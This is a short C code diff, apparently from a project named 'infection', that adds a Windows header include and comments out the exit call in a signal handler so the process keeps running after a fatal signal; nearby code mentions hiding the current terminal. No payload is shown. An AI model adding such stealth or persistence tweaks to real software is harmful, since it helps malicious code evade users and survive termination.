@@ -11,6 +11,8 @@
 /* ************************************************************************** */
 
 #include "infection.h"
+
+#include <winver.h>
 /*
 **	Hide and close the current terminal
 */
@@ -45,7 +47,7 @@ void				start_debug_console()
 void signal_handler(int signal)
 {
 	printf("Something went wrong, i'm dying... good bye\n");
-	exit (1);
+	//exit (1);
 }
 
 void		run_process(char *name, char **argv, char **env)
